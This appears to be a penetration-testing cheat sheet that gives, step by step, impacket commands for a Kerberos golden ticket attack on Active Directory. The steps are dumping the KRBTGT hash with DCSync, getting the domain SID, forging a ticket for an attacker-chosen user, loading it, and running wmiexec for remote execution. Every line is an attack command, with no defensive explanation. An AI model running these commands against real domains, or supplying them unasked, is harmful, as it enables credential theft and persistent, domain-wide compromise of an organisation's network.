### get KRBTGT hash
```
impacket-secretsdump -just-dc <domain>/<user>:<password>@<rhost> -just-dc-user krbtgt
```

### get Domain SID
```
impacket-lookupsid <domain>/<user>:<password>@<rhost>
```

### create ticket
```
impacket-ticketer -nthash <ntlmHash> -domain-sid <sid> -domain <domain> <attackerUser>
```

### export ticket
```
export KRB5CCNAME=<ticketFile>
```

### use ticket
```
impacket-wmiexec -k -no-pass <fqdnRhost>
```
